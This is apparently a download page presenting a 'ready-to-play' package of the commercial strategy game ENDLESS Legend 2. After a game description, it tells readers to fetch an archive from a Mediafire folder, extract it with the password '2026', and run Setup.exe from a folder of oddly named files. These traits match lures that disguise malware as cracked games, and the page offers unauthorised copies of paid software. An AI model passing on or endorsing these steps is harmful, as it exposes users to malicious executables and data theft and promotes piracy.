## 🕹️ About

ENDLESS Legend™ 2 is a turn-based 4X strategy game developed by AMPLITUDE Studios and published by Hooded Horse. Set on the oceanic world of Saiadha, it follows rival factions struggling to survive and expand as the planet’s shifting tides reshape the battlefield. Explore a changing world, develop cities, research technologies, manage resources, complete faction quests, and pursue different paths to victory. Distinct factions offer asymmetric abilities, stories, and strategies, making each campaign play differently. This ready-to-play release is packaged for quick setup: unpack, run, and play.

A strong fit for players who enjoy deep turn-based strategy, science-fantasy worldbuilding, replayable campaigns, and carefully differentiated factions.

## ✨ Features

- 🗺️ **4X Strategy** — Explore, expand, exploit resources, and eliminate competing powers.
- 🏙️ **Empire Building** — Develop cities, manage resources, research technologies, and shape your territory.
- ⚔️ **Tactical Battles** — Command armies and adapt your battle plans to terrain and faction strengths.
- 📖 **Faction Stories** — Follow narrative quests that connect each faction to the wider ENDLESS universe.
- 🏛️ **Asymmetric Factions** — Choose factions with distinct identities, mechanics, objectives, and lore.
- 🌊 **Changing World** — Explore Saiadha as receding oceans and Tidefalls transform the map.

### Step 1: Download

Download the ready-to-play package from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the setup expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- animations.dll <- Animation system
|-- dlc.md5 <- DLC checksums
|-- driver.pak <- Driver archive
|-- license.bank <- License data
|-- launcher.dll <- Launcher library
|-- patch_1.bnk <- Audio banks
|-- installer.dat <- Installer data
|-- localization.ini <- Language files
|-- update_1.res <- Update resources
|-- uninstall.key <- Uninstall key
|-- physics.sys <- Physics engine
|-- Password 2026.txt <- Password reminder (empty)
|-- settings.bin <- Configuration
|-- assets.wem <- Asset audio
|-- driver.umap <- Driver data
|-- res.pak <- Resources archive
|-- license.wem <- Audio assets
|-- update_1.ini <- Update config
|-- api.pak <- API modules
|-- lang.sys <- Language system
|-- audio.res <- Audio resources
|-- scripts.lic <- Game scripts
|-- bootstrap.wem <- Bootstrap audio
|-- global.cfg <- Global settings
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game is ready to play
